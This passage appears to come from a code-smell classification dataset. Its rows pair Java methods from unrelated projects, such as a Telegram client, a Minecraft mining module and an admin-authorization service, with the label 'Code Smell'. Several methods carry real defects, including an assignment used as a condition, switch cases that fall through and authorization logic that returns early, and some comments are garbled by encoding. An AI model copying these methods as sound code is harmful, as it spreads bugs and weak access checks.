        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,null,new String[]{""goog"",""face""});
      assertEquals(4,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,new String[]{""gmail.com""},null,new String[]{""goog""});
      assertEquals(1,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,new String[]{""gmail.com""},null,new String[]{""goog"",""face""});
      assertEquals(2,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
  }
}",1,Code Smell
"public void generateCaption(){
  if (caption != null && translated == captionTranslated || isRoundVideo()) {
    return;
  }
  String text=messageOwner.message;
  ArrayList<TLRPC.MessageEntity> entities=messageOwner.entities;
  if (hasExtendedMedia()) {
    text=messageOwner.message=messageOwner.media.description;
  }
  if (captionTranslated=translated) {
    text=messageOwner.translatedText.text;
    entities=messageOwner.translatedText.entities;
  }
  if (captionTranslated=translated) {
    text=messageOwner.translatedText.text;
    entities=messageOwner.translatedText.entities;
  }
 else   if (messageOwner.translated) {
    text=messageOwner.translatedMessage;
  }
  if (!isMediaEmpty() && !(getMedia(messageOwner) instanceof TLRPC.TL_messageMediaGame) && !TextUtils.isEmpty(text)) {
    caption=Emoji.replaceEmoji(text,Theme.chat_msgTextPaint.getFontMetricsInt(),AndroidUtilities.dp(20),false);
    caption=replaceAnimatedEmoji(caption,Theme.chat_msgTextPaint.getFontMetricsInt());
    boolean hasEntities;
    if (messageOwner.send_state != MESSAGE_SEND_STATE_SENT) {
      hasEntities=false;
    }
 else {
      hasEntities=!entities.isEmpty();
    }
    boolean useManualParse=!hasEntities && (eventId != 0 || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaPhoto_old || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaPhoto_layer68 || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaPhoto_layer74 || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaDocument_old || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaDocument_layer68 || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaDocument_layer74 || isOut() && messageOwner.send_state != MESSAGE_SEND_STATE_SENT || messageOwner.id < 0);
    if (useManualParse) {
      if (containsUrls(caption)) {
        try {
          AndroidUtilities.addLinks((Spannable)caption,Linkify.WEB_URLS | Linkify.PHONE_NUMBERS);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
      addUrlsByPattern(isOutOwner(),caption,true,0,0,true);
    }
    try {
      AndroidUtilities.addProxyLinks((Spannable)caption);
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    addEntitiesToText(caption,useManualParse);
    if (isVideo()) {
      addUrlsByPattern(isOutOwner(),caption,true,3,getDuration(),false);
    }
 else     if (isMusic() || isVoice()) {
      addUrlsByPattern(isOutOwner(),caption,true,4,getDuration(),false);
    }
  }
}",1,Code Smell
"@Override protected boolean appendVisibleItemsWithoutCache(int toLimit,boolean oneColumnMode){
  final int count=mProvider.getCount();
  int itemIndex;
  int rowIndex;
  int edgeLimit;
  boolean edgeLimitIsValid;
  if (mLastVisibleIndex >= 0) {
    if (mLastVisibleIndex < getLastIndex()) {
      return false;
    }
    itemIndex=mLastVisibleIndex + 1;
    rowIndex=getLocation(mLastVisibleIndex).row;
    int edgeLimitSearchIndex=findRowEdgeLimitSearchIndex(true);
    if (edgeLimitSearchIndex < 0) {
      edgeLimit=Integer.MIN_VALUE;
      for (int i=0; i < mNumRows; i++) {
        edgeLimit=mReversedFlow ? getRowMin(i) : getRowMax(i);
        if (edgeLimit != Integer.MIN_VALUE) {
          break;
        }
      }
    }
 else {
      edgeLimit=mReversedFlow ? findRowMin(false,edgeLimitSearchIndex,null) : findRowMax(true,edgeLimitSearchIndex,null);
    }
    if (mReversedFlow ? getRowMin(rowIndex) <= edgeLimit : getRowMax(rowIndex) >= edgeLimit) {
      rowIndex=rowIndex + 1;
      if (rowIndex == mNumRows) {
        rowIndex=0;
        edgeLimit=mReversedFlow ? findRowMin(false,null) : findRowMax(true,null);
      }
    }
    edgeLimitIsValid=true;
  }
 else {
    itemIndex=mStartIndex != START_DEFAULT ? mStartIndex : 0;
    rowIndex=(mLocations.size() > 0 ? getLocation(getLastIndex()).row + 1 : itemIndex) % mNumRows;
    edgeLimit=0;
    edgeLimitIsValid=false;
  }
  boolean filledOne=false;
  while (true) {
    for (; rowIndex < mNumRows; rowIndex++) {
      if (itemIndex == count || (!oneColumnMode && checkAppendOverLimit(toLimit))) {
        return filledOne;
      }
      int location=mReversedFlow ? getRowMin(rowIndex) : getRowMax(rowIndex);
      if (location == Integer.MAX_VALUE || location == Integer.MIN_VALUE) {
        if (rowIndex == 0) {
          location=mReversedFlow ? getRowMin(mNumRows - 1) : getRowMax(mNumRows - 1);
          if (location != Integer.MAX_VALUE && location != Integer.MIN_VALUE) {
            location=location + (mReversedFlow ? -mSpacing : mSpacing);
          }
        }
 else {
          location=mReversedFlow ? getRowMax(rowIndex - 1) : getRowMin(rowIndex - 1);
        }
      }
 else {
        location=location + (mReversedFlow ? -mSpacing : mSpacing);
      }
      int size=appendVisibleItemToRow(itemIndex++,rowIndex,location);
      filledOne=true;
      if (edgeLimitIsValid) {
        while (mReversedFlow ? location - size > edgeLimit : location + size < edgeLimit) {
          if (itemIndex == count || (!oneColumnMode && checkAppendOverLimit(toLimit))) {
            return filledOne;
          }
          location=location + (mReversedFlow ? -size - mSpacing : size + mSpacing);
          size=appendVisibleItemToRow(itemIndex++,rowIndex,location);
        }
      }
 else {
        edgeLimitIsValid=true;
        edgeLimit=mReversedFlow ? getRowMin(rowIndex) : getRowMax(rowIndex);
      }
    }
    if (oneColumnMode) {
      return filledOne;
    }
    edgeLimit=mReversedFlow ? findRowMin(false,null) : findRowMax(true,null);
    rowIndex=0;
  }
}",1,Code Smell
"public boolean validAndFillFields(BaseSource source,StringBuilder strBuff){
  if (indexMsg) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_INDEXMSG_ILLEGAL);
    this.errCode=DataProxyErrCode.UNSUPPORTED_EXTEND_FIELD_VALUE;
    return false;
  }
  if (!validAndFillTopic(source)) {
    return false;
  }
  this.msgSeqId=strBuff.append(this.groupId).append(AttributeConstants.SEPARATOR).append(this.streamId).append(AttributeConstants.SEPARATOR).append(strRemoteIP).append(""#"").append(dataTimeMs).append(""#"").append(uniq).toString();
  strBuff.delete(0,strBuff.length());
  if (StringUtils.isBlank(attrMap.get(AttributeConstants.MSG_RPT_TIME))) {
    strBuff.append(AttributeConstants.MSG_RPT_TIME).append(AttributeConstants.KEY_VALUE_SEPARATOR).append(msgRcvTime);
    attrMap.put(AttributeConstants.MSG_RPT_TIME,String.valueOf(msgRcvTime));
  }
  this.auditVersion=AuditUtils.getAuditVersion(this.attrMap);
  if (this.needTraceMsg) {
    if (strBuff.length() > 0) {
      strBuff.append(AttributeConstants.SEPARATOR);
    }
    strBuff.append(AttributeConstants.DATAPROXY_NODE_IP).append(AttributeConstants.KEY_VALUE_SEPARATOR).append(source.getStrPort()).append(AttributeConstants.SEPARATOR).append(AttributeConstants.DATAPROXY_RCVTIME).append(AttributeConstants.KEY_VALUE_SEPARATOR).append(msgRcvTime);
    attrMap.put(AttributeConstants.DATAPROXY_NODE_IP,source.getSrcHost());
    attrMap.put(AttributeConstants.DATAPROXY_RCVTIME,String.valueOf(msgRcvTime));
  }
  if (this.transNum2Name) {
    if (strBuff.length() > 0) {
      strBuff.append(AttributeConstants.SEPARATOR);
    }
    strBuff.append(AttributeConstants.GROUP_ID).append(AttributeConstants.KEY_VALUE_SEPARATOR).append(groupId).append(AttributeConstants.SEPARATOR).append(AttributeConstants.STREAM_ID).append(AttributeConstants.KEY_VALUE_SEPARATOR).append(streamId);
    for (    Map.Entry<String,String> entry : attrMap.entrySet()) {
      if (AttributeConstants.GROUP_ID.equalsIgnoreCase(entry.getKey()) || AttributeConstants.STREAM_ID.equalsIgnoreCase(entry.getKey())) {
        continue;
      }
      strBuff.append(AttributeConstants.SEPARATOR).append(entry.getKey()).append(AttributeConstants.KEY_VALUE_SEPARATOR).append(entry.getValue());
    }
    this.groupIdNum=0;
    this.streamIdNum=0;
    this.num2name=false;
    this.extendField=this.extendField | 0x4;
    attrMap.put(AttributeConstants.GROUP_ID,groupId);
    attrMap.put(AttributeConstants.STREAM_ID,streamId);
  }
  if (strBuff.length() > 0) {
    if (StringUtils.isNotBlank(origAttr)) {
      strBuff.append(AttributeConstants.SEPARATOR).append(origAttr);
    }
    totalDataLen+=strBuff.length() - origAttr.length();
    origAttr=strBuff.toString();
    strBuff.delete(0,strBuff.length());
  }
  return true;
}",1,Code Smell
"@SuppressLint(""WrongConstant"") @Override public void onReceive(Context context,Intent intent){
  String action=intent.getAction();
  if (action == null)   return;
switch (action) {
case ACTION_PREFIX + ""ClearMemory"":
{
      Intent clearIntent=new Intent(""com.android.systemui.taskmanager.Clear"");
      clearIntent.putExtra(""show_toast"",true);
      context.sendBroadcast(clearIntent);
    }
case ACTION_PREFIX + ""OpenRecents"":
{
    Intent recentIntent=new Intent(""SYSTEM_ACTION_RECENTS"");
    recentIntent.setPackage(""com.android.systemui"");
    context.sendBroadcast(recentIntent);
  }
case ACTION_PREFIX + ""OpenVolumeDialog"":
;
case ACTION_PREFIX + ""OpenNotificationCenter"":
{
try {
  Object mNotificationPanel=XposedHelpers.getObjectField(mStatusBar,""mNotificationPanel"");
  boolean mPanelExpanded=(boolean)XposedHelpers.getObjectField(mNotificationPanel,""mPanelExpanded"");
  boolean mQsExpanded=(boolean)XposedHelpers.getObjectField(mNotificationPanel,""mQsExpanded"");
  boolean expandOnly=intent.getBooleanExtra(""expand_only"",false);
  if (mPanelExpanded) {
    if (!expandOnly) {
      if (mQsExpanded) {
        XposedHelpers.callMethod(mStatusBar,""closeQs"");
      }
 else {
        XposedHelpers.callMethod(mStatusBar,""animateCollapsePanels"");
      }
    }
  }
 else {
    XposedHelpers.callMethod(mStatusBar,""animateExpandNotificationsPanel"");
  }
}
 catch (Throwable t) {
  long token=Binder.clearCallingIdentity();
  XposedHelpers.callMethod(context.getSystemService(""statusbar""),""expandNotificationsPanel"");
  Binder.restoreCallingIdentity(token);
}
}
}
}
@Override public void onReceive(Context context,Intent intent){
  String action=intent.getAction();
  if (action == null)   return;
  if (action.equals(ACTION_PREFIX + ""RestartSystemUI"")) {
    Process.sendSignal(Process.myPid(),Process.SIGNAL_KILL);
  }
}
",1,Code Smell
"@EventHandler private void onTick(TickEvent.Post event){
  if (isFull()) {
    if (walkHome.get()) {
      if (isBaritoneNotWalking()) {
        info(""Walking home."");
        baritone.getCustomGoalProcess().setGoalAndPath(new GoalBlock(homePos));
      }
 else       if (mc.player.getBlockPos().equals(homePos) && logOut.get())       logOut();
    }
 else     if (logOut.get())     logOut();
 else {
      info(""Inventory full, stopping process."");
      toggle();
    }
    return;
  }
  if (!findPickaxe()) {
    error(""Could not find a usable mending pickaxe."");
    toggle();
    return;
  }
  if (!checkThresholds()) {
    error(""Start mining value can't be lower than start repairing value."");
    toggle();
    return;
  }
  if (repairing) {
    if (!needsRepair()) {
      warning(""Finished repairing, going back to mining."");
      repairing=false;
      mineTargetBlocks();
      return;
    }
    if (isBaritoneNotMining())     mineRepairBlocks();
  }
 else {
    if (needsRepair()) {
      warning(""Pickaxe needs repair, beginning repair process"");
      repairing=true;
      mineRepairBlocks();
      return;
    }
    if (isBaritoneNotMining())     mineTargetBlocks();
  }
}
",1,Code Smell
"public void toggleItemSelection(MessageObject message,View view,int a){
  FilteredSearchView.MessageHashId hashId=new FilteredSearchView.MessageHashId(message.getId(),message.getDialogId());
  if (selectedFiles.containsKey(hashId)) {
    selectedFiles.remove(hashId);
  }
 else {
    if (selectedFiles.size() >= 100) {
      return;
    }
    selectedFiles.put(hashId,message);
  }
  if (selectedFiles.size() == 0) {
    showActionMode(false);
  }
 else {
    selectedMessagesCountTextView.setNumber(selectedFiles.size(),true);
    if (gotoItem != null) {
      gotoItem.setVisibility(selectedFiles.size() == 1 ? View.VISIBLE : View.GONE);
    }
    if (speedItem != null) {
      boolean visible=isSpeedItemVisible();
      int v=visible ? View.VISIBLE : View.GONE;
      if (speedItem.getVisibility() != v) {
        speedItem.setVisibility(v);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
          AnimatedVectorDrawable drawable=(AnimatedVectorDrawable)speedItem.getIconView().getDrawable();
          drawable.setColorFilter(new PorterDuffColorFilter(Theme.getColor(Theme.key_actionBarActionModeDefaultIcon),PorterDuff.Mode.SRC_IN));
          if (visible) {
            drawable.start();
          }
 else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
              drawable.reset();
            }
 else {
              drawable.setVisible(false,true);
            }
          }
        }
      }
    }
    if (deleteItem != null) {
      boolean canShowDelete=true;
      Set<FilteredSearchView.MessageHashId> keySet=selectedFiles.keySet();
      for (      FilteredSearchView.MessageHashId key : keySet) {
        if (!selectedFiles.get(key).isDownloadingFile) {
          canShowDelete=false;
          break;
        }
      }
      deleteItem.setVisibility(canShowDelete ? View.VISIBLE : View.GONE);
    }
  }
  if (view instanceof SharedDocumentCell) {
    ((SharedDocumentCell)view).setChecked(selectedFiles.containsKey(hashId),true);
  }
 else   if (view instanceof SharedPhotoVideoCell) {
    ((SharedPhotoVideoCell)view).setChecked(a,selectedFiles.containsKey(hashId),true);
  }
 else   if (view instanceof SharedLinkCell) {
    ((SharedLinkCell)view).setChecked(selectedFiles.containsKey(hashId),true);
  }
 else   if (view instanceof SharedAudioCell) {
    ((SharedAudioCell)view).setChecked(selectedFiles.containsKey(hashId),true);
  }
 else   if (view instanceof ContextLinkCell) {
    ((ContextLinkCell)view).setChecked(selectedFiles.containsKey(hashId),true);
  }
 else   if (view instanceof DialogCell) {
    ((DialogCell)view).setChecked(selectedFiles.containsKey(hashId),true);
  }
}",1,Code Smell
"public void setRightPadding(int padding){
  if (paddingRight != padding) {
    paddingRight=padding;
    int width=getMaxTextWidth() - getPaddingLeft() - getPaddingRight()- minusWidth;
    if (leftDrawable != null) {
      width-=leftDrawable.getIntrinsicWidth();
      width-=drawablePadding;
    }
    int rightDrawableWidth=0;
    if (rightDrawable != null && !rightDrawableOutside) {
      rightDrawableWidth=(int)(rightDrawable.getIntrinsicWidth() * rightDrawableScale);
      width-=rightDrawableWidth;
      width-=drawablePadding;
    }
    if (replacedText != null && replacedDrawable != null) {
      if ((replacingDrawableTextIndex=text.toString().indexOf(replacedText)) < 0) {
        width-=replacedDrawable.getIntrinsicWidth();
        width-=drawablePadding;
      }
    }
    if (canHideRightDrawable && rightDrawableWidth != 0 && !rightDrawableOutside) {
      CharSequence string=TextUtils.ellipsize(text,textPaint,width,TextUtils.TruncateAt.END);
      if (!text.equals(string)) {
        rightDrawableHidden=true;
        width+=rightDrawableWidth;
        width+=drawablePadding;
      }
    }
    calcOffset(width);
    invalidate();
  }
}",1,Code Smell
"/** 
 * Uncompresses the data in  {@code input}.
 * @param input Wraps the compressed input data.
 * @param output Wraps an output buffer to be used to store the uncompressed data. If {@code output.data} isn't big enough to hold the uncompressed data, a new array is created. If{@code true} is returned then the output's position will be set to 0 and its limit will beset to the length of the uncompressed data.
 * @param inflater If not null, used to uncompressed the input. Otherwise a new {@link Inflater}is created.
 * @return Whether the input is uncompressed successfully.
 */
public static boolean inflate(ParsableByteArray input,ParsableByteArray output,@Nullable Inflater inflater){
  if (input.bytesLeft() <= 0) {
    return false;
  }
  byte[] outputData=output.data;
  if (outputData.length < input.bytesLeft()) {
    outputData=new byte[2 * input.bytesLeft()];
  }
  if (inflater == null) {
    inflater=new Inflater();
  }
  inflater.setInput(input.data,input.getPosition(),input.bytesLeft());
  try {
    int outputSize=0;
    while (true) {
      outputSize+=inflater.inflate(outputData,outputSize,outputData.length - outputSize);
      if (inflater.finished()) {
        output.reset(outputData,outputSize);
        return true;
      }
      if (inflater.needsDictionary() || inflater.needsInput()) {
        return false;
      }
      if (outputSize == outputData.length) {
        outputData=Arrays.copyOf(outputData,outputData.length * 2);
      }
    }
  }
 catch (  DataFormatException e) {
    return false;
  }
 finally {
    inflater.reset();
  }
}",1,Code Smell
"public void rotate(float angle){
  if (!hasStickyAngle) {
    for (    int stickyAngle : STICKY_ANGLES) {
      if (Math.abs(stickyAngle - angle) < STICKY_TRIGGER_ANGLE) {
        currentStickyAngle=stickyAngle;
        hasStickyAngle=true;
        try {
          performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
        }
 catch (        Exception ignored) {
        }
        if (angleAnimator != null) {
          angleAnimator.cancel();
        }
        if (fromStickyAngleAnimator != null) {
          fromStickyAngleAnimator.cancel();
        }
        angleAnimator=ValueAnimator.ofFloat(0,1).setDuration(150);
        angleAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
        float from=angle;
        angleAnimator.addUpdateListener(animation -> {
          stickyAnimatedAngle=AndroidUtilities.lerpAngle(from,currentStickyAngle,animation.getAnimatedFraction());
          rotateInternal(stickyAnimatedAngle);
        }
);
        angleAnimator.addListener(new AnimatorListenerAdapter(){
          @Override public void onAnimationEnd(          Animator animation){
            if (animation == angleAnimator) {
              angleAnimator=null;
              stickyAnimatedAngle=0;
            }
          }
        }
);
        angleAnimator.start();
        break;
      }
    }
  }
 else {
    if (Math.abs(currentStickyAngle - angle) >= STICKY_THRESHOLD_ANGLE) {
      if (angleAnimator != null) {
        angleAnimator.cancel();
      }
      if (fromStickyAngleAnimator != null) {
        fromStickyAngleAnimator.cancel();
      }
      fromStickyAnimatedAngle=currentStickyAngle;
      fromStickyToAngle=angle;
      fromStickyAngleAnimator=ValueAnimator.ofFloat(0,1).setDuration(150);
      fromStickyAngleAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
      fromStickyAngleAnimator.addUpdateListener(animation -> rotateInternal(AndroidUtilities.lerpAngle(fromStickyAnimatedAngle,fromStickyToAngle,fromStickyAngleAnimator.getAnimatedFraction())));
      fromStickyAngleAnimator.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          if (animation == fromStickyAngleAnimator) {
            fromStickyAngleAnimator=null;
          }
        }
      }
);
      fromStickyAngleAnimator.start();
      hasStickyAngle=false;
    }
 else {
      if (angleAnimator != null) {
        angle=stickyAnimatedAngle;
      }
 else {
        angle=currentStickyAngle;
      }
    }
  }
  if (fromStickyAngleAnimator != null) {
    fromStickyToAngle=angle;
    angle=AndroidUtilities.lerpAngle(fromStickyAnimatedAngle,fromStickyToAngle,fromStickyAngleAnimator.getAnimatedFraction());
  }
  rotateInternal(angle);
}",1,Code Smell
"@Test public void unsubscribePullEvents(){
  final EventBus eventBus=new EventBus(keyedExecutor,broadcastExecutor,timer);
  eventBus.subscribeForPull(TOPIC_1,SUBSCRIBER_1,event -> true).toCompletableFuture().join();
  eventBus.subscribeForPull(TOPIC_2,SUBSCRIBER_1,event -> true).toCompletableFuture().join();
  for (int i=0; i < 3; i++) {
    eventBus.publish(TOPIC_1,constructEvent(EventType.PRIORITY,UUID.randomUUID().toString())).toCompletableFuture().join();
  }
  eventBus.publish(TOPIC_2,constructEvent(EventType.PRIORITY,UUID.randomUUID().toString())).toCompletableFuture().join();
  for (int i=0; i < 3; i++) {
    Assert.assertNotNull(eventBus.poll(TOPIC_1,SUBSCRIBER_1).toCompletableFuture().join());
  }
  Assert.assertNotNull(eventBus.poll(TOPIC_2,SUBSCRIBER_1).toCompletableFuture().join());
  eventBus.unsubscribe(TOPIC_1,SUBSCRIBER_1).toCompletableFuture().join();
  for (int i=0; i < 2; i++) {
    eventBus.publish(TOPIC_2,constructEvent(EventType.PRIORITY,UUID.randomUUID().toString())).toCompletableFuture().join();
  }
  for (int i=0; i < 3; i++) {
    eventBus.publish(TOPIC_1,constructEvent(EventType.PRIORITY,UUID.randomUUID().toString())).toCompletableFuture().join();
  }
  Assert.assertTrue(eventBus.poll(TOPIC_1,SUBSCRIBER_1).handle((__,throwable) -> throwable.getCause() instanceof UnsubscribedPollException).toCompletableFuture().join());
  for (int i=0; i < 2; i++) {
    Assert.assertNotNull(eventBus.poll(TOPIC_2,SUBSCRIBER_1).toCompletableFuture().join());
  }
  eventBus.subscribeForPull(TOPIC_1,SUBSCRIBER_1,event -> true).toCompletableFuture().join();
  for (int i=0; i < 3; i++) {
    eventBus.publish(TOPIC_1,constructEvent(EventType.PRIORITY,UUID.randomUUID().toString())).toCompletableFuture().join();
  }
  for (int i=0; i < 3; i++) {
    Assert.assertNotNull(eventBus.poll(TOPIC_1,SUBSCRIBER_1).toCompletableFuture().join());
  }
  Assert.assertNull(eventBus.poll(TOPIC_2,SUBSCRIBER_1).toCompletableFuture().join());
}",1,Code Smell
"/** 
 * 鑾峰彇瑙嗛鎾斁淇℃伅
 * @param flag     鎾斁婧�
 * @param id       瑙嗛id
 * @param vipFlags 鎵�鏈夊彲鑳介渶瑕乿ip瑙ｆ瀽鐨勬簮
 * @return
 */
@Override public String playerContent(String flag,String id,List<String> vipFlags){
  try {
    String url=siteUrl + id;
    Document doc=Jsoup.parse(OkHttpUtil.string(url,getHeaders(url)));
    Elements e=doc.select(""div>script"");
    String player="""";
    String pn="""";
    JSONObject result=new JSONObject();
    for (    Element element : e) {
      String[] data=element.data().toString().split(""var"");
      for (      String variable : data) {
        if (variable.contains(""="")) {
          if (variable.contains(""now"")) {
            String[] kvp=variable.split(""="");
            player=kvp[1].replaceAll(""\"""","""").replaceAll("";"","""");
            if (player.startsWith(""base64"")) {
              String[] plist1=player.split(""\\("");
              String[] plist2=plist1[1].split(""\\)"");
              player=new String(Base64.decode(plist2[0].getBytes(),Base64.DEFAULT));
            }
            if (!player.startsWith(""http"")) {
              player=siteUrl + player;
            }
          }
          if (variable.contains(""pn"")) {
            String[] kvp=variable.split(""="");
            pn=kvp[1].replaceAll(""\"""","""").replaceAll("";"","""");
          }
        }
      }
      if (playerConfig.has(pn)) {
        JSONObject pCfg=playerConfig.getJSONObject(pn);
        String videoUrl=player;
        String playUrl=pCfg.getString(""pu"");
        result.put(""parse"",pCfg.getInt(""sn""));
        result.put(""playUrl"",playUrl);
        result.put(""url"",videoUrl);
        result.put(""header"","""");
      }
    }
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"/** 
 * 鏄惁鐩稿悓鐗堟湰鍙枫��
 * @param obj
 * @return
 */
public boolean isEqual(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (!(obj instanceof Version))   return false;
  Version other=(Version)obj;
  if (build == null) {
    if (other.build != null)     return false;
  }
 else   if (!build.equals(other.build))   return false;
  if (major == null) {
    if (other.major != null)     return false;
  }
 else   if (!major.equals(other.major))   return false;
  if (minor == null) {
    if (other.minor != null)     return false;
  }
 else   if (!minor.equals(other.minor))   return false;
  if (revision == null) {
    if (other.revision != null)     return false;
  }
 else   if (!revision.equals(other.revision))   return false;
  return true;
}
",1,Code Smell
"@Override public String[] getExactTableNames(Connection cn,String[] tableNames) throws DBMetaResolverException {
  String[] re=new String[tableNames.length];
  Arrays.fill(re,null);
  String catalog=getCatalog(cn);
  DatabaseMetaData metaData=getDatabaseMetaData(cn);
  String schema=getSchema(cn,metaData);
  ResultSet rs=null;
  String[] tableTypes=getTableTypes(cn);
  try {
    rs=getTableResulSet(cn,metaData,catalog,schema,null,tableTypes);
    MetaResultSet mrs=MetaResultSet.valueOf(rs);
    while (rs.next()) {
      String name=mrs.getString(""TABLE_NAME"",null);
      if (name != null) {
        int okCount=0;
        for (int i=0; i < tableNames.length; i++) {
          if (re[i] != null && re[i].equals(tableNames[i]))           continue;
          if (name.equals(tableNames[i])) {
            re[i]=name;
            okCount++;
          }
 else           if (re[i] == null && name.equalsIgnoreCase(tableNames[i])) {
            re[i]=name;
          }
        }
        if (okCount == tableNames.length)         break;
      }
    }
  }
 catch (  SQLException e) {
    throw new DBMetaResolverException(e);
  }
 finally {
    JdbcUtil.closeResultSet(rs);
  }
  return re;
}",1,Code Smell
"public static DocumentFile findSubtitle(DocumentFile video){
  DocumentFile dir=video.getParentFile();
  return findSubtitle(video,dir);
}
public static DocumentFile findSubtitle(DocumentFile video,DocumentFile dir){
  String videoName=getFileBaseName(video.getName());
  int videoFiles=0;
  if (dir == null || !dir.isDirectory())   return null;
  List<DocumentFile> candidates=new ArrayList<>();
  for (  DocumentFile file : dir.listFiles()) {
    final String fileName=file.getName();
    if (fileName != null && fileName.startsWith("".""))     continue;
    if (isSubtitleFile(file))     candidates.add(file);
    if (isVideoFile(file))     videoFiles++;
  }
  if (videoFiles == 1 && candidates.size() == 1) {
    return candidates.get(0);
  }
  if (candidates.size() >= 1) {
    for (    DocumentFile candidate : candidates) {
      if (candidate.getName().startsWith(videoName + '.')) {
        return candidate;
      }
    }
  }
  return null;
}",1,Code Smell
"public void putResourcePool(String projectId,Map<String,Object> configMap,String type){
  String poolType=null;
  String moduleType=null;
  if (StringUtils.isBlank(type)) {
    return;
  }
  if (type.equals(""apiTest"")) {
    poolType=ProjectApplicationType.API.API_RESOURCE_POOL_ID.name();
    moduleType=""api_test"";
  }
  if (StringUtils.isNotBlank(poolType) && StringUtils.isNotBlank(moduleType)) {
    if (configMap.containsKey(poolType)) {
      int count=0;
      TestResourcePoolExample example=new TestResourcePoolExample();
      example.createCriteria().andIdEqualTo(configMap.get(poolType).toString()).andAllOrgEqualTo(true);
      if (testResourcePoolMapper.countByExample(example) > 0) {
        count=extProjectMapper.resourcePoolIsExist(configMap.get(poolType).toString(),projectId);
      }
 else {
        count=extProjectMapper.resourcePoolIsExistByOrg(configMap.get(poolType).toString(),projectId);
      }
      if (count == 0) {
        configMap.remove(poolType);
      }
    }
    if (!configMap.containsKey(poolType)) {
      List<ProjectTestResourcePool> projectTestResourcePools=extProjectMapper.getResourcePool(projectId);
      if (CollectionUtils.isNotEmpty(projectTestResourcePools)) {
        projectTestResourcePools.sort(Comparator.comparing(ProjectTestResourcePool::getTestResourcePoolId));
        configMap.put(poolType,projectTestResourcePools.getFirst().getTestResourcePoolId());
      }
    }
  }
}",1,Code Smell
"public void updateUserSystemGlobalRole(@Valid User user,@Valid @NotEmpty String operator,@Valid @NotEmpty List<String> roleList){
  List<String> deleteRoleList=new ArrayList<>();
  List<UserRoleRelation> saveList=new ArrayList<>();
  List<UserRoleRelation> userRoleRelationList=this.selectGlobalRoleByUserId(user.getId());
  List<String> userSavedRoleIdList=userRoleRelationList.stream().map(UserRoleRelation::getRoleId).toList();
  for (  String userSavedRoleId : userSavedRoleIdList) {
    if (!roleList.contains(userSavedRoleId)) {
      deleteRoleList.add(userSavedRoleId);
    }
  }
  for (  String roleId : roleList) {
    if (!userSavedRoleIdList.contains(roleId)) {
      UserRoleRelation userRoleRelation=new UserRoleRelation();
      userRoleRelation.setId(IDGenerator.nextStr());
      userRoleRelation.setUserId(user.getId());
      userRoleRelation.setRoleId(roleId);
      userRoleRelation.setSourceId(UserRoleScope.SYSTEM);
      userRoleRelation.setCreateTime(System.currentTimeMillis());
      userRoleRelation.setCreateUser(operator);
      userRoleRelation.setOrganizationId(UserRoleScope.SYSTEM);
      saveList.add(userRoleRelation);
    }
  }
  if (CollectionUtils.isNotEmpty(deleteRoleList)) {
    List<String> deleteIdList=new ArrayList<>();
    userRoleRelationList.forEach(item -> {
      if (deleteRoleList.contains(item.getRoleId())) {
        deleteIdList.add(item.getId());
      }
    }
);
    UserRoleRelationExample deleteExample=new UserRoleRelationExample();
    deleteExample.createCriteria().andIdIn(deleteIdList);
    userRoleRelationMapper.deleteByExample(deleteExample);
    operationLogService.batchAdd(this.getBatchLogs(deleteRoleList,user,""updateUser"",operator,OperationLogType.DELETE.name()));
  }
  if (CollectionUtils.isNotEmpty(saveList)) {
    saveList.forEach(item -> userRoleRelationMapper.insert(item));
    operationLogService.batchAdd(this.getBatchLogs(saveList.stream().map(UserRoleRelation::getRoleId).toList(),user,""updateUser"",operator,OperationLogType.ADD.name()));
  }
}
",1,Code Smell
"/** 
 * 閰嶇疆UI閴存潈
 */
@Override public boolean allowVisit(MagicUser magicUser,MagicHttpServletRequest request,Authorization authorization){
  if (eruptUserService.getCurrentUid() == null) {
    throw new EruptWebApiRuntimeException(LOGIN_EXPIRE);
  }
 else   if (null == eruptUserService.getEruptMenuByValue(EruptMagicApiAutoConfiguration.MAGIC_API_MENU_PREFIX + authorization.name())) {
    throw new EruptWebApiRuntimeException(NO_PERMISSION);
  }
  return true;
}
@Override public boolean allowVisit(MagicUser magicUser,MagicHttpServletRequest request,Authorization authorization,Group group){
  if (null == eruptUserService.getCurrentUid())   throw new EruptWebApiRuntimeException(LOGIN_EXPIRE);
  MetaUserinfo metaUserinfo=eruptUserService.getSimpleUserInfo();
  if (!metaUserinfo.isSuperAdmin()) {
    if (!group.getOptions().isEmpty()) {
      for (      BaseDefinition option : group.getOptions()) {
        if (null != option.getValue() && StringUtils.isNotBlank(option.getValue().toString())) {
          if (Options.ROLE.getValue().equals(option.getName())) {
            return metaUserinfo.getRoles().stream().anyMatch(it -> it.equals(option.getValue()));
          }
 else           if (Options.PERMISSION.getValue().equals(option.getName())) {
            return null != eruptUserService.getEruptMenuByValue(option.getValue().toString());
          }
        }
      }
    }
  }
  return true;
}
@Override public boolean allowVisit(MagicUser magicUser,MagicHttpServletRequest request,Authorization authorization,MagicEntity entity){
  if (entity instanceof FunctionInfo) {
    if (Authorization.SAVE == authorization || Authorization.DELETE == authorization) {
